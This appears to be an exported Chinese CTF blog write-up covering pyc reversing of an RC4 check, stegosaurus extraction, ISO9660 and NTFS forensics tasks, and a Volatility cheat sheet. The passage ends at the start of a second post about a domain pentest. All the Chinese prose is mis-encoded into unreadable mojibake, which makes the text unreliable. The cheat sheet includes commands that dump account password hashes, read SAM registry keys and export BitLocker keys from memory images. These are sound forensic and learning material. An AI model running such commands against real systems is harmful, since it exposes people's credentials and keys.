ç¡®å®šå°±æ˜¯æœ€æ–°çš„ Python 3.10.0b2 ä½†è¿˜æ˜¯éœ€è¦åç¼–è¯‘è¿™ä¸ªpyc uncompyle6 https://pypi.org/project/uncompyle6/ ç›®å‰åªæ”¯æŒ python 2.4-3.8 https://github.com/rocky/python-decompile3 ä¸è¡Œ dis å¯ &gt;&gt;&gt; import marshal, dis &gt;&gt;&gt; with open('decode.pyc','rb') as f: ... metadata = f.read(16) ... code_obj = marshal.load(f) ... &gt;&gt;&gt; dis.dis(code_obj) 4 0 LOAD_CONST 0 (0) 2 LOAD_CONST 1 (None) 4 IMPORT_NAME 0 (sys) 6 STORE_NAME 0 (sys) 6 8 LOAD_CONST 0 (0) 10 LOAD_CONST 2 (('sha256',)) 12 IMPORT_NAME 1 (hashlib) 14 IMPORT_FROM 2 (sha256) 16 STORE_NAME 2 (sha256) 18 POP_TOP 16 20 LOAD_CONST 3 (&lt;code object KSA at 0x7f1199dc7890, file \"main.py\", line 6&gt;) 22 LOAD_CONST 4 ('KSA') 24 MAKE_FUNCTION 0 26 STORE_NAME 3 (KSA) 26 28 LOAD_CONST 5 (&lt;code object PRGA at 0x7f1199dc7940, file \"main.py\", line 16&gt;) 30 LOAD_CONST 6 ('PRGA') 32 MAKE_FUNCTION 0 34 STORE_NAME 4 (PRGA) 30 36 LOAD_CONST 7 (&lt;code object RC4 at 0x7f1199dc7aa0, file \"main.py\", line 26&gt;) 38 LOAD_CONST 8 ('RC4') 40 MAKE_FUNCTION 0 42 STORE_NAME 5 (RC4) 33 44 LOAD_CONST 9 (&lt;code object xor at 0x7f1199dd4500, file \"main.py\", line 30&gt;) 46 LOAD_CONST 10 ('xor') 48 MAKE_FUNCTION 0 50 STORE_NAME 6 (xor) 34 52 LOAD_NAME 7 (__name__) 54 LOAD_CONST 11 ('__main__') 56 COMPARE_OP 2 (==) 58 POP_JUMP_IF_FALSE 139 (to 278) 35 60 LOAD_CONST 12 (b'\\xf6\\xef\\x10H\\xa9\\x0f\\x9f\\xb5\\x80\\xc1xd\\xae\\xd3\\x03\\xb2\\x84\\xc2\\xb4\\x0e\\xc8\\xf3&lt;\\x151\\x19\\n\\x8f') 62 STORE_NAME 8 (w) 38 64 LOAD_CONST 13 (b'$\\r9\\xa3\\x18\\xddW\\xc9\\x97\\xf3\\xa7\\xa8R~') 66 STORE_NAME 9 (e) 39 68 LOAD_CONST 14 (b'geo') 70 STORE_NAME 10 (b) 41 72 LOAD_CONST 15 (b'}\\xce`\\xbej\\xa2\\x120\\xb5\\x8a\\x94\\x14{\\xa3\\x86\\xc8\\xc7\\x01\\x98\\xa3_\\x91\\xd8\\x82T*V\\xab\\xe0\\xa1\\x141') 74 STORE_NAME 11 (s) 42 76 LOAD_CONST 16 (b\"Q_\\xe2\\xf8\\x8c\\x11M}'&lt;@\\xceT\\xf6?_m\\xa4\\xf8\\xb4\\xea\\xca\\xc7:\\xb9\\xe6\\x06\\x8b\\xeb\\xfabH\\x85xJ3$\\xdd\\xde\\xb6\\xdc\\xa0\\xb8b\\x961\\xb7\\x13=\\x17\\x13\\xb1\") 78 STORE_NAME 12 (t) 43 80 LOAD_CONST 17 (115) 82 LOAD_CONST 18 (97) 84 LOAD_CONST 19 (117) 86 LOAD_CONST 20 (114) 88 LOAD_CONST 21 ((2, 8, 11, 10)) 90 BUILD_CONST_KEY_MAP 4 92 STORE_NAME 13 (m) 44 94 LOAD_CONST 22 (119) 96 LOAD_CONST 23 (116) 98 LOAD_CONST 24 (124) 100 LOAD_CONST 25 (127) 102 LOAD_CONST 26 ((3, 7, 9, 12)) 104 BUILD_CONST_KEY_MAP 4 106 STORE_NAME 14 (n) 45 108 LOAD_NAME 13 (m) 110 LOAD_CONST 27 (&lt;code object &lt;dictcomp&gt; at 0x7f1199dd4c90, file \"main.py\", line 44&gt;) 112 LOAD_CONST 28 ('&lt;dictcomp&gt;') 114 MAKE_FUNCTION 0 116 LOAD_NAME 14 (n) 118 GET_ITER 120 CALL_FUNCTION 1 122 INPLACE_OR 124 STORE_NAME 13 (m) 47 126 LOAD_NAME 13 (m) 128 LOAD_CONST 29 (&lt;code object &lt;genexpr&gt; at 0x7f1199dd5b00, file \"main.py\", line 45&gt;) 130 LOAD_CONST 30 ('&lt;genexpr&gt;') 132 MAKE_FUNCTION 0 134 LOAD_NAME 10 (b) 136 GET_ITER 138 CALL_FUNCTION 1 140 INPLACE_OR 142 STORE_NAME 13 (m) 48 144 LOAD_NAME 5 (RC4) 146 LOAD_NAME 15 (list) 148 LOAD_NAME 16 (map) 150 LOAD_CONST 31 (&lt;code object &lt;lambda&gt; at 0x7f1199a42d90, file \"main.py\", line 47&gt;) 152 LOAD_CONST 32 ('&lt;lambda&gt;') 154 MAKE_FUNCTION 0 156 LOAD_NAME 17 (sorted) 158 LOAD_NAME 13 (m) 160 LOAD_METHOD 18 (items) 162 CALL_METHOD 0 164 CALL_FUNCTION 1 166 CALL_FUNCTION 2 168 CALL_FUNCTION 1 170 CALL_FUNCTION 1 172 STORE_NAME 19 (stream) 49 174 LOAD_NAME 20 (print) 176 LOAD_NAME 6 (xor) 178 LOAD_NAME 8 (w) 180 LOAD_NAME 19 (stream) 182 CALL_FUNCTION 2 184 LOAD_METHOD 21 (decode) 186 CALL_METHOD 0 188 CALL_FUNCTION 1 190 POP_TOP 50 192 LOAD_NAME 0 (sys) 194 LOAD_ATTR 22 (stdin) 196 LOAD_ATTR 23 (buffer) 198 LOAD_METHOD 24 (read) 200 CALL_METHOD 0 202 STORE_NAME 25 (p) 52 204 LOAD_NAME 6 (xor) 206 LOAD_NAME 9 (e) 208 LOAD_NAME 19 (stream) 210 CALL_FUNCTION 2 212 STORE_NAME 9 (e) 53 214 LOAD_NAME 6 (xor) 216 LOAD_NAME 25 (p) 218 LOAD_NAME 19 (stream) 220 CALL_FUNCTION 2 222 STORE_NAME 26 (c) 54 224 LOAD_NAME 2 (sha256) 226 LOAD_NAME 26 (c) 228 CALL_FUNCTION 1 230 LOAD_METHOD 27 (digest) 232 CALL_METHOD 0 234 LOAD_NAME 11 (s) 236 COMPARE_OP 2 (==) 238 POP_JUMP_IF_FALSE 131 (to 262) 56 240 LOAD_NAME 20 (print) 242 LOAD_NAME 6 (xor) 244 LOAD_NAME 12 (t) 246 LOAD_NAME 19 (stream) 248 CALL_FUNCTION 2 250 LOAD_METHOD 21 (decode) 252 CALL_METHOD 0 254 CALL_FUNCTION 1 256 POP_TOP 258 LOAD_CONST 1 (None) 260 RETURN_VALUE 33 &gt;&gt; 262 LOAD_NAME 20 (print) 264 LOAD_NAME 9 (e) 266 LOAD_METHOD 21 (decode) 268 CALL_METHOD 0 270 CALL_FUNCTION 1 272 POP_TOP 274 LOAD_CONST 1 (None) 276 RETURN_VALUE &gt;&gt; 278 LOAD_CONST 1 (None) 280 RETURN_VALUE Disassembly of &lt;code object KSA at 0x7f1199dc7890, file \"main.py\", line 6&gt;: 8 0 LOAD_GLOBAL 0 (len) 2 LOAD_FAST 0 (key) 4 CALL_FUNCTION 1 6 STORE_FAST 1 (keylength) 9 8 LOAD_GLOBAL 1 (list) 10 LOAD_GLOBAL 2 (range) 12 LOAD_CONST 1 (256) 14 CALL_FUNCTION 1 16 CALL_FUNCTION 1 18 STORE_FAST 2 (S) 10 20 LOAD_CONST 2 (0) 22 STORE_FAST 3 (j) 11 24 LOAD_GLOBAL 2 (range) 26 LOAD_CONST 1 (256) 28 CALL_FUNCTION 1 30 GET_ITER &gt;&gt; 32 FOR_ITER 29 (to 92) 34 STORE_FAST 4 (i) 12 36 LOAD_FAST 3 (j) 38 LOAD_FAST 2 (S) 40 LOAD_FAST 4 (i) 42 BINARY_SUBSCR 44 BINARY_ADD 46 LOAD_FAST 0 (key) 48 LOAD_FAST 4 (i) 50 LOAD_FAST 1 (keylength) 52 BINARY_MODULO 54 BINARY_SUBSCR 56 BINARY_ADD 58 LOAD_CONST 1 (256) 60 BINARY_MODULO 62 STORE_FAST 3 (j) 13 64 LOAD_FAST 2 (S) 66 LOAD_FAST 3 (j) 68 BINARY_SUBSCR 70 LOAD_FAST 2 (S) 72 LOAD_FAST 4 (i) 74 BINARY_SUBSCR 76 ROT_TWO 78 LOAD_FAST 2 (S) 80 LOAD_FAST 4 (i) 82 STORE_SUBSCR 84 LOAD_FAST 2 (S) 86 LOAD_FAST 3 (j) 88 STORE_SUBSCR 90 JUMP_ABSOLUTE 16 (to 32) &gt;&gt; 92 LOAD_FAST 2 (S) 94 RETURN_VALUE Disassembly of &lt;code object PRGA at 0x7f1199dc7940, file \"main.py\", line 16&gt;: 17 0 GEN_START 0 18 2 LOAD_CONST 1 (0) 4 STORE_FAST 1 (i) 19 6 LOAD_CONST 1 (0) 8 STORE_FAST 2 (j) 20 10 NOP 21 &gt;&gt; 12 LOAD_FAST 1 (i) 14 LOAD_CONST 3 (1) 16 BINARY_ADD 18 LOAD_CONST 4 (256) 20 BINARY_MODULO 22 STORE_FAST 1 (i) 22 24 LOAD_FAST 2 (j) 26 LOAD_FAST 0 (S) 28 LOAD_FAST 1 (i) 30 BINARY_SUBSCR 32 BINARY_ADD 34 LOAD_CONST 4 (256) 36 BINARY_MODULO 38 STORE_FAST 2 (j) 23 40 LOAD_FAST 0 (S) 42 LOAD_FAST 2 (j) 44 BINARY_SUBSCR 46 LOAD_FAST 0 (S) 48 LOAD_FAST 1 (i) 50 BINARY_SUBSCR 52 ROT_TWO 54 LOAD_FAST 0 (S) 56 LOAD_FAST 1 (i) 58 STORE_SUBSCR 60 LOAD_FAST 0 (S) 62 LOAD_FAST 2 (j) 64 STORE_SUBSCR 24 66 LOAD_FAST 0 (S) 68 LOAD_FAST 0 (S) 70 LOAD_FAST 1 (i) 72 BINARY_SUBSCR 74 LOAD_FAST 0 (S) 76 LOAD_FAST 2 (j) 78 BINARY_SUBSCR 80 BINARY_ADD 82 LOAD_CONST 4 (256) 84 BINARY_MODULO 86 BINARY_SUBSCR 88 STORE_FAST 3 (K) 19 90 LOAD_FAST 3 (K) 92 YIELD_VALUE 94 POP_TOP 96 JUMP_ABSOLUTE 6 (to 12) Disassembly of &lt;code object RC4 at 0x7f1199dc7aa0, file \"main.py\", line 26&gt;: 28 0 LOAD_GLOBAL 0 (KSA) 2 LOAD_FAST 0 (key) 4 CALL_FUNCTION 1 6 STORE_FAST 1 (S) 8 LOAD_GLOBAL 1 (PRGA) 10 LOAD_FAST 1 (S) 12 CALL_FUNCTION 1 14 RETURN_VALUE Disassembly of &lt;code object xor at 0x7f1199dd4500, file \"main.py\", line 30&gt;: 31 0 LOAD_GLOBAL 0 (bytes) 2 LOAD_GLOBAL 1 (map) 4 LOAD_CLOSURE 0 (stream) 6 BUILD_TUPLE 1 8 LOAD_CONST 1 (&lt;code object &lt;lambda&gt; at 0x7f1199dd5dc0, file \"main.py\", line 31&gt;) 10 LOAD_CONST 2 ('xor.&lt;locals&gt;.&lt;lambda&gt;') 12 MAKE_FUNCTION 8 (closure) 14 LOAD_FAST 0 (p) 16 CALL_FUNCTION 2 18 CALL_FUNCTION 1 20 RETURN_VALUE Disassembly of &lt;code object &lt;lambda&gt; at 0x7f1199dd5dc0, file \"main.py\", line 31&gt;: 0 LOAD_FAST 0 (x) 2 LOAD_DEREF 0 (stream) 4 LOAD_METHOD 0 (__next__) 6 CALL_METHOD 0 8 BINARY_XOR 10 RETURN_VALUE Disassembly of &lt;code object &lt;dictcomp&gt; at 0x7f1199dd4c90, file \"main.py\", line 44&gt;: 0 BUILD_MAP 0 2 LOAD_FAST 0 (.0) &gt;&gt; 4 FOR_ITER 9 (to 24) 6 STORE_FAST 1 (x) 8 LOAD_FAST 1 (x) 10 LOAD_FAST 1 (x) 12 LOAD_GLOBAL 0 (n) 14 LOAD_FAST 1 (x) 16 BINARY_SUBSCR 18 BINARY_XOR 20 MAP_ADD 2 22 JUMP_ABSOLUTE 2 (to 4) &gt;&gt; 24 RETURN_VALUE Disassembly of &lt;code object &lt;genexpr&gt; at 0x7f1199dd5b00, file \"main.py\", line 45&gt;: 0 GEN_START 0 2 LOAD_FAST 0 (.0) &gt;&gt; 4 FOR_ITER 9 (to 24) 6 STORE_FAST 1 (i) 8 LOAD_FAST 1 (i) 10 LOAD_METHOD 0 (bit_count) 12 CALL_METHOD 0 14 LOAD_FAST 1 (i) 16 BUILD_TUPLE 2 18 YIELD_VALUE 20 POP_TOP 22 JUMP_ABSOLUTE 2 (to 4) &gt;&gt; 24 LOAD_CONST 0 (None) 26 RETURN_VALUE Disassembly of &lt;code object &lt;lambda&gt; at 0x7f1199a42d90, file \"main.py\", line 47&gt;: 0 LOAD_FAST 0 (x) 2 LOAD_CONST 1 (1) 4 BINARY_SUBSCR 6 RETURN_VALUE äººå·¥æ‰‹åŠ¨é€†å‘å¾—åˆ°å¯¹åº” python ä»£ç å¤§æ¦‚å¦‚ä¸‹ ï¼ˆæœ‰äº›åœ°æ–¹æ²¡æœ‰å®Œå…¨æŒ‰ç…§å­—èŠ‚ç æ¥å†™ import sys from hashlib import sha256 w = b'\\xf6\\xef\\x10H\\xa9\\x0f\\x9f\\xb5\\x80\\xc1xd\\xae\\xd3\\x03\\xb2\\x84\\xc2\\xb4\\x0e\\xc8\\xf3&lt;\\x151\\x19\\n\\x8f' e = b'$\\r9\\xa3\\x18\\xddW\\xc9\\x97\\xf3\\xa7\\xa8R~' b = b'geo' s = b'}\\xce`\\xbej\\xa2\\x120\\xb5\\x8a\\x94\\x14{\\xa3\\x86\\xc8\\xc7\\x01\\x98\\xa3_\\x91\\xd8\\x82T*V\\xab\\xe0\\xa1\\x141' t = b\"Q_\\xe2\\xf8\\x8c\\x11M}'&lt;@\\xceT\\xf6?_m\\xa4\\xf8\\xb4\\xea\\xca\\xc7:\\xb9\\xe6\\x06\\x8b\\xeb\\xfabH\\x85xJ3$\\xdd\\xde\\xb6\\xdc\\xa0\\xb8b\\x961\\xb7\\x13=\\x17\\x13\\xb1\" m = {2:115, 8:97, 11:117, 10:114} n = {3:119, 7:116, 9:124, 12:127} def KSA(key): keylength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] return S def PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] K = S[(S[i] + S[j]) % 256] yield K def RC4(key): S = KSA(key) return PRGA(S) def xor(p,stream): return bytes(map(lambda x:x ^ stream.__next__(), p)) # n = {2:115, 8:97, 11:117, 10:114} # x:x^n[x] -&gt; &lt;dictcomp&gt; m |= {x: x^n[x] for x in n} m |= ((i.bit_count(), i) for i in b) stream = RC4(list(map(lambda m:m[1], sorted(m.items())))) # print welcome banner... # print(stream) print(xor(w, stream).decode()) p = sys.stdin.buffer.readline() e = xor(e, stream) # print(e) c = xor(p, stream) if sha256(c).digest() != s: # error print(e.decode()) exit() print(xor(t, stream)) # true? å¤§çº¦å¯ä»¥ç›´åˆ°ï¼Œè¿™ä¸ªåœ°æ–¹é€šè¿‡çˆ†ç ´è¾“å…¥å­—ç¬¦çš„é•¿åº¦ï¼Œå¾—åˆ°tçš„çœŸå®æ•°æ® å¯ä»¥å‘ç°ï¼Œè¾“å…¥é•¿åº¦ä¸º 26 çš„æ—¶å€™ï¼Œä¼šæç¤ºè¯´ Congratulations! Now you should now what the flag isï¼Œè¿™ä¸ªå°±æ˜¯ t çš„è§£å¯†ç»“æœã€‚è€Œå…¶ä»–æƒ…å†µéƒ½ä¸èƒ½æ­£ç¡®è§£ç ã€‚ äºæ˜¯å°±å»æ‰¾å“ªé‡Œè¿˜æœ‰è¿™ä¸ªè¾“å…¥ã€‚ ç„¶åå‘ç°ç”¨ pyc éšå†™äº†ä¸€éƒ¨åˆ†å†…å®¹ï¼Œä½¿ç”¨è„šæœ¬ stegosaurus å¯¼å‡º pyc éšå†™ã€‚ ä¸€æ–‡è®©ä½ å®Œå…¨å¼„æ‡‚Stegosaurus https://github.com/AngelKitty/stegosaurus éœ€è¦é­”æ”¹ä¸€ä¸‹ headerï¼Œpython 3.10 é•¿åº¦æ˜¯16. å¦å¤–è¾“å‡ºçš„è¯ä¸ç”¨è½¬ strï¼Œç›´æ¥ bytes å°±å¥½äº†ã€‚ å¾—åˆ°é•¿åº¦ä¸º 26 çš„ bytes b'\\xe5\\n2\\xd6\"\\xf0}I\\xb0\\xcd\\xa2\\x11\\xf0\\xb4U\\x166\\xc5o\\xdb\\xc9\\xead\\x04\\x15b' æœ€åå°†è¿™ä¸ªä½œä¸ºè¾“å…¥ï¼Œç„¶åè®©ä¸Šè¿°ä»£ç çš„ c æ‰“å°å‡ºæ¥ï¼Œå³ä¸º flag flag{P0w5rFu1_0pEn_50urcE} ISO1995 We follow ISO1995. ISO1995 has many problems though. One known problem is a time. é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ å‹ç¼©åŒ…è§£å‹å¯†ç ï¼šfantasicqwb2021 ä¸‹è½½ä¸‹æ¥ä»¥ iso9660 æŒ‚è½½ mount -t iso9660 iso1995 /mnt/éšä¾¿ä¸€ä¸ªç›®å½• å‘ç°æœ‰ä¸€å †åä¸º flag_fxxxxx ï¼ˆxxxxä¸ºæ•°å­—ï¼‰çš„æ–‡ä»¶ã€‚ ç”¨ ultraISO æŠŠæ–‡ä»¶å¯¼å‡ºæ¥ï¼Œå‘ç°æ¯ä¸ªæ–‡ä»¶åªæœ‰ä¸€ä¸ªå­—ç¬¦ã€‚ å¦å¤–æ ¹æ®é¢˜ç›®æç¤ºï¼ŒæŸ¥çœ‹ hex å‘ç°ä»–æ¯ä¸ªæ–‡ä»¶åä¹‹å‰çš„ FFFFFFFF ä¹‹åè·Ÿç€çš„ 2bytes éƒ½ä¸åŒï¼Œæ€€ç–‘æ˜¯ä¸ªåºå·æˆ–è€…æ—¶é—´ä¹‹ç±»çš„ã€‚ äºæ˜¯å†™ä¸ªè„šæœ¬æå–ï¼Œè½¬æˆåè¿›åˆ¶ä½œä¸ºæ–‡ä»¶åå¹¶æŒ‰ç…§è¿™ä¸ªé¡ºåºæŠŠæ–‡ä»¶å†…å®¹è¯»å–å‡ºæ¥ã€‚ import re with open('iso1995_trunk_hex', 'r', encoding='utf-8') as fin: s = fin.read() s = s.strip().replace(' ', '').replace('\\n', '') print(s) # FFFFFFFF027D08020000010000011A0066006C00610067005F006600300031003000310031003B0031003C0041040000000004410100000000000001 # FFFFFFFF001E08020000010000011A0066006C00610067005F006600300031003000300038003B0031003C003E0400000000043E0100000000000001 # FFFFFFFF011208020000010000011A0066006C00610067005F006600300030003900340032003B0031003C00FC030000000003FC0100000000000001 re_num = re.compile( r'FFFFFFFF(\\w{4})08020000010000011A0066006C00610067005F006600(\\w{18})') l = re_num.findall(s) len(l) # 1024 filename_list = [] for i in l: name = int(i[0], 16) # print(name) filename_list.append(name) decode_str2 = '' for i in filename_list: filename = f'./iso1995file/flag_f{str(i).rjust(5, \"0\")}' with open(filename, 'r', encoding='utf-8') as f: x = f.read() print(x) decode_str2 += x print(decode_str2) # !Sdk*t eiW!BJ9$QpR. pIk{V#t:NE;J8M{Qi&gt;W%|1vw&lt;9_*2AG\\SX_6{)'n4)GwcPx8gp[6Z_'.#Y(=zCs/2*^DwpC6@=KBz\\+0ngA@C(cJSiE'ShHjW,*Xu{Y&gt;5rGyMWX_mY,htG1KLE`pNNMYd?U\\SF&lt;%O,qeVflr$,CO@V.s-%.@C'&amp;I2[36?&lt;k)N^Z0~IgP-k=L-Ip0URu_&lt;P6T?/LF\\~K~q6%76}!_WR&amp;nojVK`KGYZwx\"G4^4=&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z/Xh=V(J`jus9Jw-Pmp1=[|b5;\"Z{[qNI&amp;9/.2@b&gt;'Vxo {1)xT_'3FoRIP~O`&amp;!K'ZAKM&lt;Hrg$D_*&gt;8G%UT{oN41|4P42S~6*g2KJ}o,8j/]&amp;FimP0V2c::+{#;Bj@Cd\\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!/bbB(v/Q(6ez{bKoH'-B'*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\\+`abDa7w16BySRx-#D/-a1O55Q`F&lt;75{8f)4rlgQW]K=oT1J$Ar= W$LW9!~TphteN=b&amp;s}.714G_8W~!@8=%gh%\"K:&lt;@7o*5+y+}+fCF'NEYN0{P4T_hz(3|Y7ZA1fsu\\B6bxi#_+wKPs^C1^Ywa,{'&amp;i]Hq+P8&lt;WQ5sKu!abFLAG{Dir3ct0ry_jYa_n41}R:k_#z^'mT?,3$H \"W+xr-Yzn-D-ribi,wKf|&amp;$2:/q?8:jmcI|4L:+`KDx])5+A_m13/7R1VQ:[Dc&amp;.TcvPv$tOb}X&amp;-K'f:.&lt;,bO~0r,=olgKP&amp;x U %(HFjNtCDaJiHW+N1WK=(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn=k#7i,3YHK_Z;o%8[xZy;:&lt;1}OT1IHSn&gt;gn`n;YI9[M't@v%}Iz0fmVl#ls+aI\\: 6?|VvGHD~Q0O4{-.siztGve H&lt;f@kXEt@WWHW\",81m*S1lbQZ+mK9rB'TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*}.7pRx\"t1vzM):FL3r@:-C1 # FLAG{Dir3ct0ry_jYa_n41} FLAG{Dir3ct0ry_jYa_n41} èµ›åå‘ç°è¿™ä¸ªåˆæ˜¯åŸé¢˜ã€‚ã€‚ 2020 BingoCTF - ISO Solution.md å°±ç¦»è°±ï¼ˆ EzTime Forensic.Find a file that a time attribute has been modified by a program. ï¼ˆæœ¬é¢˜flagä¸ºéæ­£å¼å½¢å¼ï¼‰ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ å‹ç¼©åŒ…è§£å‹å¯†ç ï¼šfantasicqwb2021 è§£å‹å¾—åˆ° $LogFileã€$MFT (Master File Table) File - $LogFile (2) NTFS Timestamp changes on Windows 10 Do you MFT? Hereâ€™s an MFT Overview. https://github.com/dkovar/analyzeMFT https://github.com/jschicht/LogFileParser æœ€ååˆæ‰¾åˆ°äº†ä¸ª NTFS Log Tracker å·¥å…· å¯¼å…¥ä¹‹åå¯ä»¥çœ‹åˆ°ç›¸å…³ä¿¡æ¯ æ‰¾äº†è€åŠå¤©æ—¶é—´å‚æ•°è¢«ä¿®æ”¹çš„æ–‡ä»¶ï¼Œæœ€åå‘ç°æ˜¯è¿™ä¸ªï¼ˆ å¯ä»¥æŠŠæ—¶é—´å¯¼å‡ºæ¥å‘ç°ç§’ä»¥ä¸‹éƒ½æ˜¯ 000000â€¦ æäº¤çš„ flag å°±æ˜¯ {45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png é—®å·é¢˜flag{Welc0me_tO_qwbS5_Hope_you_play_h4ppily} å°ç»“å¥½å‡ æ¬¡æ¯”èµ›éƒ½å‡ºäº†å†…å­˜å–è¯çš„é¢˜ç›®äº†ï¼Œè¿™é‡Œæ­£å¥½å°±æ•´ç†ä¸€ä¸‹å§ã€‚ volatility -f winxp.raw imageinfo # æŸ¥è¯¢é•œåƒåŸºæœ¬ä¿¡æ¯ï¼Œç¡®å®šå½“å‰ç³»ç»Ÿ volatility -f winxp.raw --profile=WinXPSP3x86 filescan | grep Desktop # æ£€ç´¢æ–‡ä»¶å¹¶æŸ¥æ‰¾ä½äºæ¡Œé¢ä¸Šçš„ volatility -f winxp.raw --profile=WinXPSP3x86 dumpfiles -Q 0x000000003fa4b450 -D . -u # å¯¼å‡ºæŒ‡å®šçš„æ–‡ä»¶åˆ°å½“å‰ç›®å½• volatility -f winxp.raw --profile=WinXPSP3x86 pstree # æŸ¥è¿è¡Œè¿›ç¨‹è¿›ç¨‹æ ‘ volatility -f winxp.raw --profile=WinXPSP3x86 pslist # æŸ¥æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ volatility -f winxp.raw --profile=WinXPSP3x86 memdump -p 324 --dump-dir . # å°†PID=324çš„è¿›ç¨‹dumpå‡ºæ¥ volatility -f winxp.raw --profile=WinXPSP3x86 procdump -p 324 --dump-dir . # å°†PID=324è¿›ç¨‹å¯¼å‡ºä¸ºexe volatility -f winxp.raw --profile=WinXPSP3x86 dlldump -p 324 --dump-dir . # å°†PID=324è¿›ç¨‹çš„æ‰€æœ‰DLLå¯¼å‡º volatility -f winxp.raw --profile=WinXPSP3x86 getsids -p 324 # æŸ¥è¯¢æŒ‡å®šè¿›ç¨‹çš„SID volatility -f winxp.raw --profile=WinXPSP3x86 dlllist -p 324 # æŸ¥è¯¢æŒ‡å®šè¿›ç¨‹åŠ è½½è¿‡çš„DLL volatility -f winxp.raw --profile=WinXPSP3x86 threads -p 324 # åˆ—å‡ºå½“å‰è¿›ç¨‹ä¸­æ´»è·ƒçš„çº¿ç¨‹ volatility -f winxp.raw --profile=WinXPSP3x86 drivermodule # åˆ—å‡ºç›®æ ‡ä¸­é©±åŠ¨åŠ è½½æƒ…å†µ volatility -f winxp.raw --profile=WinXPSP3x86 malfind -p 324 -D . # æ£€ç´¢å†…å­˜è¯»å†™æ‰§è¡Œé¡µ volatility -f winxp.raw --profile=WinXPSP3x86 iehistory # æ£€ç´¢IEæµè§ˆå™¨å†å²è®°å½• volatility -f winxp.raw --profile=WinXPSP3x86 joblinks # æ£€ç´¢è®¡åˆ’ä»»åŠ¡ volatility -f winxp.raw --profile=WinXPSP3x86 cmdscan # åªèƒ½æ£€ç´¢å‘½ä»¤è¡Œå†å² volatility -f winxp.raw --profile=WinXPSP3x86 consoles # æŠ“å–æ§åˆ¶å°ä¸‹æ‰§è¡Œçš„å‘½ä»¤ä»¥åŠå›æ˜¾æ•°æ® volatility -f winxp.raw --profile=WinXPSP3x86 cmdline # åˆ—å‡ºæ‰€æœ‰å‘½ä»¤è¡Œä¸‹è¿è¡Œçš„ç¨‹åº volatility -f mem.data --profile=WinXPSP3x86 screenshot -D . # å±å¹•æˆªå›¾ï¼Œæ˜¾ç¤ºå„ä¸ªçª—å£ä¹‹é—´çš„å…³ç³» volatility -f winxp.raw --profile=WinXPSP3x86 connscan # æ£€ç´¢å·²ç»å»ºç«‹çš„ç½‘ç»œé“¾æ¥ volatility -f winxp.raw --profile=WinXPSP3x86 connections # æ£€ç´¢å·²ç»å»ºç«‹çš„ç½‘ç»œé“¾æ¥ volatility -f winxp.raw --profile=WinXPSP3x86 netscan # æ£€ç´¢æ‰€æœ‰ç½‘ç»œè¿æ¥æƒ…å†µ volatility -f winxp.raw --profile=WinXPSP3x86 sockscan # TrueCryptæ‘˜è¦TrueCryptæ‘˜è¦ volatility -f winxp.raw --profile=WinXPSP3x86 timeliner # å°½å¯èƒ½å¤šçš„å‘ç°ç›®æ ‡ä¸»æœºç—•è¿¹ volatility -f winxp.raw --profile=WinXPSP3x86 hivelist # æ£€ç´¢æ‰€æœ‰æ³¨å†Œè¡¨èœ‚å·¢ volatility -f winxp.raw --profile=WinXPSP3x86 hivedump -o 0xe144f758 # æ£€ç´¢SAMæ³¨å†Œè¡¨é”®å€¼å¯¹ volatility -f winxp.raw --profile=WinXPSP3x86 dumpregistry -D . # å¯¼å‡ºæ³¨å†Œè¡¨ volatility -f winxp.raw --profile=WinXPSP3x86 printkey -K \"SAM\\Domains\\Account\\Users\\Names\" # æ£€ç´¢æ³¨å†Œè¡¨ä¸­è´¦å·å¯†ç  volatility -f winxp.raw --profile=WinXPSP3x86 hashdump -y systemåœ°å€ -s SAMåœ°å€ # dumpç›®æ ‡è´¦å·Hashå€¼ volatility -f winxp.raw --profile=WinXPSP3x86 printkey -K \"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" # æŸ¥æœ€åç™»å½•çš„ç”¨æˆ· volatility -f winxp.raw --profile=WinXPSP3x86 userassist # æŸ¥è¯¢ç¨‹åºè¿è¡Œæ¬¡æ•° volatility --plugins=plugins/bitlocker -f memdump.mem --profile=Win7SP1x64 bitlocker # å¯¼å‡º bitlocker å¯†é’¥ï¼Œéœ€è¦å®‰è£…æ’ä»¶ ï¼ˆå‚è€ƒäº† Volatility å†…å­˜æ•°å­—å–è¯æ–¹æ³•, thx è¿™æ¯”èµ›å¤ªå·å•¦å¤ªå·å•¦ï¼ æœ€åååˆ†é’Ÿç–¯ç‹‚æ‰åˆ†ï¼Œå¤ªåˆºæ¿€å•¦ï¼ï¼ï¼ æ„Ÿè°¢é˜Ÿå‹å¸¦å–µå–µä¸€èµ·ç© qwqï¼ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/06/28/CTF_2021qiangwang/"},{"title":"Pentest | 2021 DozerCTF åŸŸæ¸—é€ Workthrough","text":"æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼šhttps://xz.aliyun.com/t/9738 æœ¬æ–‡æ‰€æ¶‰åŠçš„å†…å®¹ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ ç ”ç©¶ä½¿ç”¨ï¼Œä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼ 0x00 å¼•è¨€äº”æœˆåº•æœ‰ä¸ª DozerCTFï¼Œæ¯”èµ›æ—¶é—´å’Œ XCTF Finalã€DASCTF ç­‰å‡ ä¸ªæ¯”èµ›å†²çªäº†ï¼Œäºæ˜¯å½“æ—¶è¿™ä¸ªæ¯”èµ›å°±åŸºæœ¬æ²¡çœ‹äº†ã€‚ 